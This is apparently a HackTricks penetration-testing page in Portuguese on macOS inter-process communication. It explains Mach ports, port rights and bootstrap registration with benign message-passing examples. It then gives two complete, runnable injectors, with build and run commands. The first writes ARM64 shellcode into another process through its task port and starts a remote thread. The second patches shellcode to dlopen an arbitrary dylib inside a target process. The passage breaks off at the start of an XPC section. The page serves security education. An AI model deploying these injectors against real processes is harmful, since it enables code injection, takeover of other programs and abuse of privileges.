# macOS IPC - Comunicação entre Processos

{{#include ../../../../banners/hacktricks-training.md}}

## Mensagens Mach via Portas

### Informações Básicas

Mach usa **tarefas** como a **menor unidade** para compartilhar recursos, e cada tarefa pode conter **múltiplas threads**. Essas **tarefas e threads são mapeadas 1:1 para processos e threads POSIX**.

A comunicação entre tarefas ocorre via Comunicação Inter-Processos Mach (IPC), utilizando canais de comunicação unidirecionais. **Mensagens são transferidas entre portas**, que atuam como **filas de mensagens** gerenciadas pelo kernel.

Cada processo possui uma **tabela IPC**, onde é possível encontrar as **portas mach do processo**. O nome de uma porta mach é, na verdade, um número (um ponteiro para o objeto do kernel).

Um processo também pode enviar um nome de porta com alguns direitos **para uma tarefa diferente** e o kernel fará com que essa entrada na **tabela IPC da outra tarefa** apareça.

### Direitos de Porta

Os direitos de porta, que definem quais operações uma tarefa pode realizar, são fundamentais para essa comunicação. Os possíveis **direitos de porta** são ([definições daqui](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Direito de Receber**, que permite receber mensagens enviadas para a porta. As portas Mach são filas MPSC (múltiplos produtores, um único consumidor), o que significa que pode haver apenas **um direito de receber para cada porta** em todo o sistema (diferente de pipes, onde múltiplos processos podem manter descritores de arquivo para a extremidade de leitura de um pipe).
- Uma **tarefa com o Direito de Receber** pode receber mensagens e **criar Direitos de Envio**, permitindo que envie mensagens. Originalmente, apenas a **própria tarefa tem o Direito de Receber sobre sua porta**.
- **Direito de Enviar**, que permite enviar mensagens para a porta.
- O Direito de Enviar pode ser **clonado**, de modo que uma tarefa que possui um Direito de Enviar pode clonar o direito e **concedê-lo a uma terceira tarefa**.
- **Direito de Enviar uma vez**, que permite enviar uma mensagem para a porta e depois desaparece.
- **Direito de Conjunto de Portas**, que denota um _conjunto de portas_ em vez de uma única porta. Desenfileirar uma mensagem de um conjunto de portas desenfileira uma mensagem de uma das portas que ele contém. Conjuntos de portas podem ser usados para escutar várias portas simultaneamente, muito parecido com `select`/`poll`/`epoll`/`kqueue` no Unix.
- **Nome morto**, que não é um direito de porta real, mas apenas um espaço reservado. Quando uma porta é destruída, todos os direitos de porta existentes para a porta se tornam nomes mortos.

**As tarefas podem transferir direitos de ENVIO para outras**, permitindo que enviem mensagens de volta. **Os direitos de ENVIO também podem ser clonados, de modo que uma tarefa possa duplicar e dar o direito a uma terceira tarefa**. Isso, combinado com um processo intermediário conhecido como **servidor de inicialização**, permite uma comunicação eficaz entre tarefas.

### Portas de Arquivo

As portas de arquivo permitem encapsular descritores de arquivo em portas Mac (usando direitos de porta Mach). É possível criar um `fileport` a partir de um FD dado usando `fileport_makeport` e criar um FD a partir de um fileport usando `fileport_makefd`.

### Estabelecendo uma comunicação

#### Passos:

Como mencionado, para estabelecer o canal de comunicação, o **servidor de inicialização** (**launchd** no mac) está envolvido.

1. A tarefa **A** inicia uma **nova porta**, obtendo um **direito de RECEBER** no processo.
2. A tarefa **A**, sendo a detentora do direito de RECEBER, **gera um direito de ENVIAR para a porta**.
3. A tarefa **A** estabelece uma **conexão** com o **servidor de inicialização**, fornecendo o **nome do serviço da porta** e o **direito de ENVIAR** através de um procedimento conhecido como registro de inicialização.
4. A tarefa **B** interage com o **servidor de inicialização** para executar uma **busca de inicialização pelo nome do serviço**. Se bem-sucedida, o **servidor duplica o direito de ENVIAR** recebido da Tarefa A e **transmite para a Tarefa B**.
5. Ao adquirir um direito de ENVIAR, a Tarefa **B** é capaz de **formular** uma **mensagem** e enviá-la **para a Tarefa A**.
6. Para uma comunicação bidirecional, geralmente a tarefa **B** gera uma nova porta com um direito de **RECEBER** e um direito de **ENVIAR**, e concede o **direito de ENVIAR à Tarefa A** para que ela possa enviar mensagens para a TAREFA B (comunicação bidirecional).

O servidor de inicialização **não pode autenticar** o nome do serviço reivindicado por uma tarefa. Isso significa que uma **tarefa** poderia potencialmente **se passar por qualquer tarefa do sistema**, como falsamente **reivindicar um nome de serviço de autorização** e, em seguida, aprovar cada solicitação.

Então, a Apple armazena os **nomes dos serviços fornecidos pelo sistema** em arquivos de configuração seguros, localizados em diretórios **protegidos pelo SIP**: `/System/Library/LaunchDaemons` e `/System/Library/LaunchAgents`. Juntamente com cada nome de serviço, o **binário associado também é armazenado**. O servidor de inicialização criará e manterá um **direito de RECEBER para cada um desses nomes de serviço**.

Para esses serviços predefinidos, o **processo de busca difere ligeiramente**. Quando um nome de serviço está sendo buscado, o launchd inicia o serviço dinamicamente. O novo fluxo de trabalho é o seguinte:

- A tarefa **B** inicia uma **busca de inicialização** por um nome de serviço.
- **launchd** verifica se a tarefa está em execução e, se não estiver, **inicia**.
- A tarefa **A** (o serviço) realiza um **check-in de inicialização**. Aqui, o **servidor de inicialização** cria um direito de ENVIAR, retém-o e **transfere o direito de RECEBER para a Tarefa A**.
- O launchd duplica o **direito de ENVIAR e o envia para a Tarefa B**.
- A Tarefa **B** gera uma nova porta com um direito de **RECEBER** e um direito de **ENVIAR**, e dá o **direito de ENVIAR à Tarefa A** (o svc) para que ela possa enviar mensagens para a TAREFA B (comunicação bidirecional).

No entanto, esse processo se aplica apenas a tarefas do sistema predefinidas. Tarefas não do sistema ainda operam como descrito originalmente, o que poderia potencialmente permitir a impersonificação.

### Uma Mensagem Mach

[Encontre mais informações aqui](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

A função `mach_msg`, essencialmente uma chamada de sistema, é utilizada para enviar e receber mensagens Mach. A função requer que a mensagem a ser enviada seja o argumento inicial. Esta mensagem deve começar com uma estrutura `mach_msg_header_t`, seguida pelo conteúdo real da mensagem. A estrutura é definida da seguinte forma:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processos que possuem um _**direito de recebimento**_ podem receber mensagens em uma porta Mach. Por outro lado, os **remetentes** recebem um _**direito de envio**_ ou um _**direito de envio-uma-vez**_. O direito de envio-uma-vez é exclusivamente para enviar uma única mensagem, após a qual se torna inválido.

Para alcançar uma fácil **comunicação bidirecional**, um processo pode especificar uma **porta mach** no **cabeçalho da mensagem** chamada de _porta de resposta_ (**`msgh_local_port`**) onde o **receptor** da mensagem pode **enviar uma resposta** a esta mensagem. Os bits em **`msgh_bits`** podem ser usados para **indicar** que um **direito de envio-uma-vez** deve ser derivado e transferido para esta porta (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

> [!TIP]
> Note que esse tipo de comunicação bidirecional é usado em mensagens XPC que esperam uma resposta (`xpc_connection_send_message_with_reply` e `xpc_connection_send_message_with_reply_sync`). Mas **geralmente portas diferentes são criadas** como explicado anteriormente para criar a comunicação bidirecional.

Os outros campos do cabeçalho da mensagem são:

- `msgh_size`: o tamanho de todo o pacote.
- `msgh_remote_port`: a porta na qual esta mensagem é enviada.
- `msgh_voucher_port`: [vouchers mach](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: o ID desta mensagem, que é interpretado pelo receptor.

> [!CAUTION]
> Note que **mensagens mach são enviadas através de uma \_porta mach**\_, que é um canal de comunicação **um único receptor**, **múltiplos remetentes** embutido no núcleo mach. **Múltiplos processos** podem **enviar mensagens** para uma porta mach, mas a qualquer momento apenas **um único processo pode ler** dela.

### Enumerar portas
```bash
lsmp -p <pid>
```
Você pode instalar esta ferramenta no iOS baixando-a de [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Exemplo de código

Note como o **remetente** **aloca** uma porta, cria um **direito de envio** para o nome `org.darlinghq.example` e o envia para o **servidor de bootstrap**, enquanto o remetente solicitou o **direito de envio** desse nome e o usou para **enviar uma mensagem**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

### Portas Privilegiadas

- **Porta do host**: Se um processo tiver privilégio de **Enviar** sobre esta porta, ele pode obter **informações** sobre o **sistema** (por exemplo, `host_processor_info`).
- **Porta priv do host**: Um processo com direito de **Enviar** sobre esta porta pode realizar **ações privilegiadas** como carregar uma extensão de kernel. O **processo precisa ser root** para obter essa permissão.
- Além disso, para chamar a API **`kext_request`**, é necessário ter outros direitos **`com.apple.private.kext*`** que são concedidos apenas a binários da Apple.
- **Porta do nome da tarefa:** Uma versão não privilegiada da _porta de tarefa_. Ela referencia a tarefa, mas não permite controlá-la. A única coisa que parece estar disponível através dela é `task_info()`.
- **Porta de tarefa** (também conhecida como porta do kernel): Com permissão de Enviar sobre esta porta, é possível controlar a tarefa (ler/escrever memória, criar threads...).
- Chame `mach_task_self()` para **obter o nome** desta porta para a tarefa chamadora. Esta porta é apenas **herdada** através de **`exec()`**; uma nova tarefa criada com `fork()` recebe uma nova porta de tarefa (como um caso especial, uma tarefa também recebe uma nova porta de tarefa após `exec()` em um binário suid). A única maneira de criar uma tarefa e obter sua porta é realizar a ["dança de troca de porta"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) enquanto faz um `fork()`.
- Estas são as restrições para acessar a porta (do `macos_task_policy` do binário `AppleMobileFileIntegrity`):
- Se o aplicativo tiver a **isenção `com.apple.security.get-task-allow`**, processos do **mesmo usuário podem acessar a porta de tarefa** (comumente adicionada pelo Xcode para depuração). O processo de **notarização** não permitirá isso em lançamentos de produção.
- Aplicativos com a isenção **`com.apple.system-task-ports`** podem obter a **porta de tarefa para qualquer** processo, exceto o kernel. Em versões mais antigas, era chamada de **`task_for_pid-allow`**. Isso é concedido apenas a aplicativos da Apple.
- **Root pode acessar portas de tarefa** de aplicativos **não** compilados com um runtime **endurecido** (e não da Apple).

### Injeção de Shellcode em thread via Porta de Tarefa

Você pode pegar um shellcode de:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compile** o programa anterior e adicione as **entitlements** para poder injetar código com o mesmo usuário (caso contrário, você precisará usar **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Injeção de Dylib em thread via Porta de Tarefa

No macOS, **threads** podem ser manipuladas via **Mach** ou usando a **api posix `pthread`**. A thread que geramos na injeção anterior foi gerada usando a api Mach, então **não é compatível com posix**.

Foi possível **injetar um shellcode simples** para executar um comando porque **não precisava trabalhar com apis** compatíveis com posix, apenas com Mach. **Injeções mais complexas** precisariam que a **thread** também fosse **compatível com posix**.

Portanto, para **melhorar a thread**, ela deve chamar **`pthread_create_from_mach_thread`**, que irá **criar um pthread válido**. Então, esse novo pthread poderia **chamar dlopen** para **carregar um dylib** do sistema, assim, em vez de escrever um novo shellcode para realizar diferentes ações, é possível carregar bibliotecas personalizadas.

Você pode encontrar **dylibs de exemplo** em (por exemplo, aquele que gera um log e depois você pode ouvi-lo):

{{#ref}}
../../macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Sequestro de Thread via Porta de Tarefa <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Nesta técnica, um thread do processo é sequestrado:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md
{{#endref}}

## XPC

### Informações Básicas

XPC, que significa XNU (o kernel usado pelo macOS) inter-Process Communication, é uma estrutura para **comunicação entre processos** no macOS e iOS. O XPC fornece um mecanismo para fazer **chamadas de método assíncronas e seguras entre diferentes processos** no sistema. É parte do paradigma de segurança da Apple, permitindo a **criação de aplicativos com separação de privilégios** onde cada **componente** é executado com **apenas as permissões necessárias** para realizar seu trabalho, limitando assim o potencial de dano de um processo comprometido.

Para mais informações sobre como essa **comunicação funciona** e como ela **pode ser vulnerável**, consulte:

{{#ref}}
